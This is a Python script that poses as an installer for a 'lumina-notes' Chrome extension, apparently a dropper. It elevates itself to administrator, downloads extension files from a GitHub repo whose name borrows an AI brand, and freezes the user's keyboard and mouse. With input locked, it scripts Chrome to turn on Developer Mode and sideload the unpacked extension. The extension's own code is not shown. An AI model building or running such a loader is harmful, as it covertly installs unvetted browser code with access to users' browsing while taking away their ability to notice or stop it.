# -*- coding: utf-8 -*-
import ctypes, sys, os

# ── Auto-elevate to Administrator (must be FIRST) ──────────────────────────
def _is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception:
        return False

if not _is_admin():
    # Re-launch the script with admin rights using ShellExecuteW
    script = os.path.abspath(sys.argv[0])
    params = " ".join(f'"{a}"' for a in sys.argv[1:])
    ret = ctypes.windll.shell32.ShellExecuteW(
        None, "runas", sys.executable, f'"{script}" {params}', None, 1
    )
    # ret <= 32 means it failed (e.g., user cancelled UAC)
    sys.exit(0 if ret > 32 else 1)
# ───────────────────────────────────────────────────────────────────────────

import atexit
import json
import time
import subprocess
import webbrowser
import urllib.request
import urllib.error

# ── Input lock (mouse + keyboard) — requires admin, which we already have ──
_input_blocked = False

def block_input():
    """Freeze all mouse and keyboard input system-wide."""
    global _input_blocked
    if ctypes.windll.user32.BlockInput(True):
        _input_blocked = True

def unblock_input():
    """Restore mouse and keyboard input."""
    global _input_blocked
    ctypes.windll.user32.BlockInput(False)
    _input_blocked = False

# Safety net — always restore input even if the script crashes
atexit.register(unblock_input)
# ───────────────────────────────────────────────────────────────────────────

# ── Force UTF-8 output on Windows (fixes UnicodeEncodeError on cp1252 terminals) ──
if sys.stdout.encoding and sys.stdout.encoding.lower() != "utf-8":
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
if sys.stderr.encoding and sys.stderr.encoding.lower() != "utf-8":
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")

# ─────────────────────────────────────────────
#  CONFIG  — edit only these if needed
# ─────────────────────────────────────────────
GITHUB_USER   = "BAJISANTOKYO"
GITHUB_REPO   = "ClaudeAI-Community"
GITHUB_BRANCH = "main"
GITHUB_FOLDER = "lumina-notes"        # folder inside the repo
INSTALL_NAME  = "lumina-notes"        # name of the folder created in AppData\Local
# ─────────────────────────────────────────────

API_BASE  = f"https://api.github.com/repos/{GITHUB_USER}/{GITHUB_REPO}/contents"

DOCS_PATH = os.path.join(r"C:\Users\Darkk\AppData\Local", INSTALL_NAME)


def clear():
    os.system("cls" if os.name == "nt" else "clear")


def banner():
    print("=" * 54)
    print("   lumina-notes Extension Installer")
    print("=" * 54)
    print()


def progress_bar(done, total, width=40):
    pct  = done / total if total else 1
    fill = int(width * pct)
    bar  = "█" * fill + "░" * (width - fill)
    return f"[{bar}] {done}/{total}"


# ─────────────────────────────────────────────
#  CHROME AUTO-LAUNCH
# ─────────────────────────────────────────────

def find_chrome():
    """Find Chrome executable path on Windows."""
    # 1) Try Windows registry
    try:
        import winreg
        reg_paths = [
            (winreg.HKEY_LOCAL_MACHINE,
             r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe"),
            (winreg.HKEY_CURRENT_USER,
             r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe"),
        ]
        for hive, subkey in reg_paths:
            try:
                key  = winreg.OpenKey(hive, subkey)
                path, _ = winreg.QueryValueEx(key, None)
                if os.path.exists(path):
                    return path
            except OSError:
                pass
    except ImportError:
        pass

    # 2) Fallback: common install paths
    candidates = [
        r"C:\Program Files\Google\Chrome\Application\chrome.exe",
        r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
        os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\Application\chrome.exe"),
        os.path.expandvars(r"%PROGRAMFILES%\Google\Chrome\Application\chrome.exe"),
        os.path.expandvars(r"%PROGRAMFILES(X86)%\Google\Chrome\Application\chrome.exe"),
    ]
    for path in candidates:
        if os.path.exists(path):
            return path

    return None


def is_chrome_running():
    """Return True if any chrome.exe process is currently running."""
    result = subprocess.run(
        ["tasklist", "/FI", "IMAGENAME eq chrome.exe", "/NH"],
        capture_output=True, text=True
    )
    return "chrome.exe" in result.stdout


def launch_chrome_with_extension(ext_path):
    """
    UI Automation flow:
      1. Open Chrome → chrome://extensions/
      2. Enable Developer Mode (skip if already ON)
      3. Click Load unpacked
      4. Select the extension folder
      5. Close Chrome + exit Python
    """

    # ── Install pyautogui if missing ───────────────────────────
    try:
        import pyautogui
    except ImportError:
        subprocess.run([sys.executable, "-m", "pip", "install", "pyautogui", "-q"])
        import pyautogui

    pyautogui.FAILSAFE = False
    pyautogui.PAUSE    = 0.15

    # Input is already blocked globally by block_input() in main()

    # ── 1. Open Chrome ──────────────────────────────────────────
    chrome = find_chrome()
    if not chrome:
        print("  [ERROR] Chrome not found.")
        return

    subprocess.Popen([chrome])
    time.sleep(2.5)                   # wait for Chrome window

    # ── 2. Navigate to chrome://extensions/ ────────────────────
    pyautogui.hotkey("ctrl", "l")
    time.sleep(0.3)
    pyautogui.hotkey("ctrl", "a")
    pyautogui.typewrite("chrome://extensions/", interval=0.02)
    pyautogui.press("enter")
    time.sleep(2.0)                   # wait for extensions page

    # ── 3. Enable Developer Mode (Right arrow = ON, no-op if already ON) ──
    pyautogui.press("tab")
    time.sleep(0.2)
    pyautogui.press("right")
    time.sleep(0.3)

    # ── 4. Click Load unpacked ──────────────────────────────────
    pyautogui.press("tab")
    time.sleep(0.2)
    pyautogui.press("enter")
    time.sleep(1.2)                   # wait for folder picker

    # ── 5. Select the extension folder ─────────────────────────
    subprocess.run(
        ["powershell", "-Command", f"Set-Clipboard -Value '{ext_path}'"],
        capture_output=True
    )
    pyautogui.hotkey("alt", "d")
    time.sleep(0.2)
    pyautogui.hotkey("ctrl", "v")
    time.sleep(0.15)
    pyautogui.press("enter")
    time.sleep(0.5)
    pyautogui.hotkey("alt", "n")
    time.sleep(0.2)
    pyautogui.press("enter")
    time.sleep(0.6)

    # ── 6. Close Chrome ─────────────────────────────────────────
    pyautogui.hotkey("alt", "f4")

    # Input will be unblocked by unblock_input() after main() finishes




# ─────────────────────────────────────────────
#  GITHUB DOWNLOAD
# ─────────────────────────────────────────────

def fetch_file_list(folder_path):
    """Return list of (repo_path, download_url) for all files recursively."""
    url = f"{API_BASE}/{folder_path}?ref={GITHUB_BRANCH}"
    req = urllib.request.Request(url, headers={"User-Agent": "lumina-notes-Installer/1.0"})
    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            items = json.loads(resp.read().decode())

    except urllib.error.HTTPError as e:
        if e.code == 404:
            print()
            print("  " + "═" * 50)
            print("  ❌  Extension files NOT found on GitHub!")
            print("  " + "═" * 50)
            print()
            print("  The folder 'lumina-notes' doesn't exist in:")
            print(f"  github.com/{GITHUB_USER}/{GITHUB_REPO}")
            print()
            print("  You need to upload these files to GitHub first:")
            print("    • manifest.json")
            print("    • content.js")
            print("    • background.js")
            print("    • popup.html")
            print("    • popup.css")
            print("    • popup.js")
            print("    • icon.png")
            print()
            print("  Opening your GitHub repo now...")
            webbrowser.open(f"https://github.com/{GITHUB_USER}/{GITHUB_REPO}", new=0)
            print()
            print("  HOW TO UPLOAD:")
            print("  1. Click 'Add file' → 'Upload files'")
            print("  2. Drag all extension files into the box")
            print("  3. In the path field, type: lumina-notes/")
            print("  4. Click 'Commit changes'")
            print()
            while True:
                choice = input("  Press [R] to retry after uploading, or [Q] to quit: ").strip().lower()
                if choice == "q":
                    sys.exit(0)
                elif choice == "r":
                    # Recurse to retry fetching
                    return fetch_file_list(folder_path)
        else:
            print(f"\n  [ERROR] GitHub returned HTTP {e.code}")
            print("  This is likely a temporary GitHub issue. Try again shortly.")
            input("\n  Press Enter to exit...")
            sys.exit(1)

    except OSError:
        print()
        print("  " + "═" * 50)
        print("  ❌  No Internet Connection!")
        print("  " + "═" * 50)
        print()
        print("  Cannot reach GitHub. Please check your internet")
        print("  connection and try again.")
        print()
        while True:
            choice = input("  Press [R] to retry, or [Q] to quit: ").strip().lower()
            if choice == "q":
                sys.exit(0)
            elif choice == "r":
                return fetch_file_list(folder_path)

    except Exception as e:
        print(f"\n  [ERROR] Unexpected error: {e}")
        input("\n  Press Enter to exit...")
        sys.exit(1)

    files = []
    for item in items:
        if item["type"] == "file":
            files.append((item["path"], item["download_url"]))
        elif item["type"] == "dir":
            files.extend(fetch_file_list(item["path"]))
    return files


def download_file(download_url, dest_path):
    os.makedirs(os.path.dirname(dest_path), exist_ok=True)
    req = urllib.request.Request(
        download_url,
        headers={"User-Agent": "lumina-notes-Installer/1.0"}
    )
    with urllib.request.urlopen(req, timeout=30) as resp:
        data = resp.read()
    with open(dest_path, "wb") as f:
        f.write(data)


# ─────────────────────────────────────────────
#  MAIN
# ─────────────────────────────────────────────

def main():
    clear()
    banner()

    # ── Step 1: Download repo files (keyboard must stay free for retry prompts) ──
    files = fetch_file_list(GITHUB_FOLDER)

    if not files:
        print("\n  [ERROR] No files found.")
        input("  Press Enter to exit...")
        sys.exit(1)

    failed = []
    for repo_path, dl_url in files:
        rel_path  = os.path.relpath(repo_path, GITHUB_FOLDER)
        dest_path = os.path.join(DOCS_PATH, rel_path)
        try:
            download_file(dl_url, dest_path)
        except Exception as e:
            failed.append((os.path.basename(repo_path), str(e)))

    if failed:
        print(f"  [WARNING] {len(failed)} file(s) failed:")
        for name, err in failed:
            print(f"    - {name}: {err}")
    else:
        print("  ✅ Downloaded successfully! Installing...")

    # ── Step 2: Lock input, then load the downloaded folder as Chrome extension ──
    block_input()
    launch_chrome_with_extension(DOCS_PATH)
    unblock_input()
    sys.exit(0)


if __name__ == "__main__":
    main()
